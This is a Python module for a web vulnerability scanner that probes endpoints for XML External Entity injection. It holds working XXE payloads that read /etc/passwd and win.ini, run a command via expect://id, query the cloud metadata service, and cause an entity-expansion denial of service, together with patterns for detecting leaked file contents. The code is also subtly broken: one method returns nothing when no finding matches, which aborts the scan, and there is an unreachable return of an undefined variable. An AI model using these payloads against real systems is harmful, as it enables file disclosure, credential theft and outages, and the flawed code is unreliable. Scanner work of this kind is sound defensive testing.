"""
XXE (XML External Entity) Injection Scanner Module
Tests for vulnerabilities where malicious XML with external entity
references is parsed by the server, leading to file disclosure,
SSRF, or denial of service.
"""
import re
import requests
from scanner_modules.url_utils import with_param
from urllib.parse import urlparse, urljoin, parse_qs


class XXEScanner:
    def __init__(self, base_url, session):
        self.base_url = base_url.rstrip('/')
        self.domain = urlparse(base_url).netloc
        self.session = session
        self.findings = []
        self.xxe_payloads = [
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]>
<foo>&xxe;</foo>""",
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<foo>&xxe;</foo>""",
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>""",
            """<?xml version="1.0"?>
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>
<root>&lol2;</root>""",
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>""",
        ]
        self.xxe_patterns = [
            r"root:.*:0:0:", r"daemon:.*:/bin", r"\\[boot loader\\]",
            r"for 16-bit app support", r"uid=", r"gid=", r"ami-id", r"instance-id",
        ]
        self.xml_content_types = [
            "application/xml", "text/xml", "application/soap+xml", "application/xhtml+xml",
        ]


    def detect_xml_endpoints(self):
        """Detect endpoints that accept XML input"""
        xml_endpoints = []
        xml_paths = ["/api", "/api/v1", "/api/v2", "/rest", "/soap",
            "/xmlrpc.php", "/xml", "/xmlapi", "/api/xml", "/rest/xml",
            "/soap/api", "/upload", "/import", "/odata"]
        for path in xml_paths:
            test_url = f"{self.base_url}{path}"
            try:
                headers = {'Content-Type': 'application/xml'}
                response = self.session.post(test_url, data="<test>1</test>", headers=headers, timeout=5)
                if response.status_code in [200, 201, 400, 500]:
                    if any(ct in response.headers.get('Content-Type', '') for ct in self.xml_content_types):
                        xml_endpoints.append(test_url)
                    elif response.status_code != 404:
                        xml_endpoints.append(test_url)
            except Exception:
                continue
        return xml_endpoints

    def test_endpoint_for_xxe(self, url):
        """Test a single endpoint for XXE vulnerabilities"""
        findings = []
        headers = {'Content-Type': 'application/xml'}
        for payload in self.xxe_payloads:
            try:
                response = self.session.post(url, data=payload, headers=headers, timeout=10)
                for pattern in self.xxe_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        findings.append({
                            'type': 'XXE Injection', 'severity': 'Critical',
                            'title': 'XXE (XML External Entity) vulnerability detected',
                            'description': f'Endpoint {url} is vulnerable to XXE injection.',
                            'url': url, 'payload': payload[:200],
                            'evidence': f'Pattern matched: {pattern}',
                            'remediation': 'Disable external entity processing in XML parser. Use JSON instead.'
                        })
                        return findings
                xml_errors = ["DOCTYPE", "external entity", "XML parsing error", "parser error"]
                for error in xml_errors:
                    if error.lower() in response.text.lower():
                        findings.append({
                            'type': 'XXE Injection', 'severity': 'Medium',
                            'title': 'Possible XXE (XML parser detected)',
                            'description': f'Endpoint {url} appears to parse XML. May be exploitable.',
                            'url': url, 'payload': payload[:200],
                            'evidence': f'Error: {error}',
                            'remediation': 'Disable external entity processing in XML parser.'
                        })
                        return findings
            except requests.exceptions.Timeout:
                findings.append({
                    'type': 'XXE Injection', 'severity': 'High',
                    'title': 'Possible XXE DoS vulnerability',
                    'description': f'Endpoint {url} timed out while processing XML.',
                    'url': url,
                    'remediation': 'Disable external entity processing and DTD support.'
                })
                return findings
            except Exception:
                continue

    def test_url_params_for_xxe(self):
        """Test URL parameters that might be parsed as XML"""
        findings = []
        for param in ["xml", "data", "request", "body", "input", "payload"]:
            test_url = with_param(self.base_url, param, "<test>1</test>")
            try:
                response = self.session.get(test_url, timeout=5)
                if any(ct in response.headers.get('Content-Type', '') for ct in self.xml_content_types):
                    findings.append({
                        'type': 'XXE Injection', 'severity': 'Info',
                        'title': 'XML-accepting parameter detected',
                        'description': f'Parameter "{param}" may accept XML input.',
                        'url': test_url,
                        'remediation': 'Ensure XML parser disables external entities.'
                    })
            except Exception:
                continue
        return findings

    def scan(self):
        """Main scanning function"""
        try:
            xml_endpoints = self.detect_xml_endpoints()
            xml_endpoints.append(self.base_url)
            response = self.session.get(self.base_url, timeout=10)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            for form in soup.find_all('form'):
                action = form.get('action', '')
                if action:
                    xml_endpoints.append(action if action.startswith('http') else urljoin(self.base_url, action))
                else:
                    xml_endpoints.append(self.base_url)
            for endpoint in set(xml_endpoints):
                self.findings.extend(self.test_endpoint_for_xxe(endpoint))
            self.findings.extend(self.test_url_params_for_xxe())
        except Exception as e:
            print(f"XXE scanning error: {e}")
        return self.findings

        return findings


